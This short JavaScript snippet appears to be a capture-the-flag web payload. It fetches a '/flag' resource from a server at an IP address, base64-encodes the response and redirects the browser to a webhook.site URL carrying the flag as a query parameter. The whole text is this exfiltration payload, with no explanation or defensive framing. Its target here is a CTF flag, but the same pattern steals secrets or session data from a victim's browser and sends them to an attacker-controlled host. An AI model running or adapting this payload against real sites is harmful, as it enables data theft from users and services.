fetch('http://165.232.190.5:1900/flag')
  .then(r => r.text())
  .then(flag => {
    console.log('Flag fetched successfully!');
    window.location.href = "https://webhook.site/10742b6c-2f72-4215-a644-6c7c11cfd1dd/?flag="+btoa(flag);
  })
  .catch(error => console.error('Error:', error));
